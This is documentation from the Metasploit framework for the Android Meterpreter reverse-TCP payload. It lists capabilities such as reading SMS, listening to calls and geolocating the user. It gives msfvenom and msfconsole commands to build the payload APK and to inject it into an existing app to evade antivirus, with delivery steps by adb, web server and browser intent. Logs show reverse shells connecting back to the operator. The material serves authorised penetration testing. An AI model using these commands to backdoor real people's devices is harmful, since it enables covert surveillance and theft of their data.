## Vulnerable Application
The android/meterpreter/reverse_tcp payload is a Java-based Meterpreter that can be used on an
Android device. It is still at an early stage of development, but there are so many things you can
do with it already.

Android Meterpreter allows you to do things like take remote control the file system,
listen to phone calls, retrieve or send SMS messages, geo-locate the user, run post-exploitation modules, etc.

You can test `android/meterpreter/reverse_tcp` on these devices:

**Android Emulator**

An emulator is the most convenient way to test Android Meterpreter. You can try:

* [Android SDK](http://developer.android.com/sdk/index.html#Other) - Creates and manages your emulators from a command prompt or terminal.
* [Android Studio](http://developer.android.com/sdk/installing/index.html?pkg=studio) - Allows you to manage emulators more easily than the SDK.
* [GenyMotion](https://www.genymotion.com/download/) - Requires an account.
* [AndroidAVDRepo](https://github.com/dral3x/AndroidAVDRepo) - Contains a collection of pre-configured emulators.
* [Bluestacks](https://www.bluestacks.com/)  - Very easy to install Android Emulator on Windows.


**A real Android device**

Having a real Android device allows you to test features or vulnerabilities you don't necessarily
have from an emulator, which might be specific to a manufacturer, carrier, or hardware. You also
get to test it over a real network.

## Verification Steps

### To create the APK with msfconsole
Currently, the most common way to use Android Meterpreter is to create it as an APK, and then
execute it on a victim device.

To create the APK with `msfconsole`:

```
msf > use payload/android/meterpreter/reverse_tcp 
msf payload(reverse_tcp) > set LHOST 192.168.1.199
LHOST => 192.168.1.199
msf payload(reverse_tcp) > generate -f raw -o /tmp/android.apk
[*] Writing 8992 bytes to /tmp/android.apk...
msf payload(reverse_tcp) >
```

### To create the APK with msfvenom:

```
./msfvenom -p android/meterpreter/reverse_tcp LHOST=[IP] LPORT=4444 -f raw -o /tmp/android.apk
```

### To inject Meterpreter into an existing APK with msfvenom:

You can also add Android Meterpreter to any existing APK. This will make it harder for
Anti-virus software to detect the payload, and allow you read internal files and take
screenshots of the Android app that you are backdooring:

```
./msfvenom -p android/meterpreter/reverse_tcp -x <PATH TO EXISTING APK FILE> LHOST=[IP] LPORT=4444 -f raw -o /tmp/android.apk
```

[Please see here for more documentation on Android injection](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/payload/android/meterpreter/injection.md).


Next, start an Android device. Upload the APK, and execute it. There are different ways to do this,
so please refer to the Scenarios section for more information.

prompt. For example:

```
meterpreter > run post/android/capture/screen 
```

## Scenarios

**Uploading APK to an Emulator using install_msf_apk.sh**

The Metasploit Framework comes with a script that allows you to automatically upload your APK to
an active emulator and execute it. It requires the [Android SDK platform-tools](http://developer.android.com/sdk/installing/index.html)
to run, as well as [Java](https://java.com/en/download/).

To use this, follow these steps:

1. Start the Android Emulator
2. Generate the Android payload as an APK.
3. In `msfconsole`, start a handler for `android/meterpreter/reverse_tcp`
4. Run the installer script like this from a terminal:

```
$ tools/exploit/install_msf_apk.sh /tmp/android.apk
```

The script will do something like this:

```
$ tools/exploit/install_msf_apk.sh /tmp/android.apk 
   adding: META-INF/ANDROIDD.SF
   adding: META-INF/ANDROIDD.RSA
  signing: classes.dex
  signing: AndroidManifest.xml
  signing: resources.arsc
Failure
1562 KB/s (10715 bytes in 0.006s)
	pkg: /data/local/tmp/android.apk
Success
rm failed for -f, Read-only file system
Starting: Intent { act=android.intent.action.MAIN cmp=com.metasploit.stage/.MainActivity }
```

Back in `msfconsole`, you should receive a session:

```
[*] Started reverse TCP handler on 192.168.1.199:4444 
[*] Starting the payload handler...
[*] Sending stage (62432 bytes) to 192.168.1.199
[*] Meterpreter session 1 opened (192.168.1.199:4444 -> 192.168.1.199:49178) at 2016-03-08 13:00:10 -0600

meterpreter > 
```

**Uploading APK to a real Android device using install_msf_apk.sh**

On the Android device, make sure to enable Developer Options. To do this:

1. Go to Settings -> About -> Software Information
2. Tap on the Build Number section a couple of times. It should unlock Developer Options.
3. Go back to the Settings page, you should see Developer Options.

Under Developer Options, make sure to:

* Enable USB debugging
* Disable Verify apps via USB
* Open a terminal, and type: `adb devices`. On your Android device, you should see a prompt
  asking you to allow the computer for debugging, click OK on that.
* Do: `adb devices` again, adb should now have access.

Run the installer script like this from a terminal:

```
$ tools/exploit/install_msf_apk.sh /tmp/android.apk
```

And you should get a session.

**Uploading APK from a Web Server**

One way to upload an APK to Android without adb is by hosting it from a web server. To do this,
you must make sure to allow to trust "Unknown sources". The way to do this varies, but normally
it's something like this: Settings -> Security -> Check "Unknown Sources"

Once you have that changed, you'll need to:

1. Generate the APK payload.
2. Start a web server from the directory where the payload is: `ruby -run -e httpd . -p 8181`
3. On your Android device, open a browser, and download the APK.
4. You should be able to find the APK from the Downloads folder, install it.
5. After installation, you will have to manually execute it.

**Reconnect Android Meterpreter from the Browser Remotely**

When you have the APK payload installed on your Android device, another trick to reconnect it is to
launch an intent from a browser. An intent is simply a term in Android development that means "an operation to be performed."

Here's how you do this:

1. In `msfconsole`, start a `multi/handler` for `android/meterpreter/reverse_tcp` as a background job.
2. Do: `auxiliary/server/android_browsable_msf_launch`.
3. Set the URIPATH if needed.
4. Do: `run`. At this point, the web server should be up.
5. On your Android device, open the native web browser, and go the URL generated by the auxiliary
   module.
6. The Android handler should get a session like the following demo:

```
msf > use exploit/multi/handler 
msf exploit(handler) > set PAYLOAD android/meterpreter/reverse_tcp
PAYLOAD => android/meterpreter/reverse_tcp
msf exploit(handler) > set LHOST 192.168.1.199
LHOST => 192.168.1.199
msf exploit(handler) > set EXITONSESSION false
EXITONSESSION => false
msf exploit(handler) > run -j
[*] Exploit running as background job.

[*] Started reverse TCP handler on 192.168.1.199:4444 
msf exploit(handler) > [*] Starting the payload handler...

msf exploit(handler) > use auxiliary/server/android_browsable_msf_launch
msf auxiliary(android_browsable_msf_launch) > set URIPATH /test
URIPATH => /test
msf auxiliary(android_browsable_msf_launch) > run

[*] Using URL: http://0.0.0.0:8080/test
[*] Local IP: http://192.168.1.199:8080/test
[*] Server started.
[*] Sending HTML...
[*] Sending stage (62432 bytes) to 192.168.1.207
[*] Meterpreter session 1 opened (192.168.1.199:4444 -> 192.168.1.207:47523) at 2016-03-08 15:09:25 -0600
```
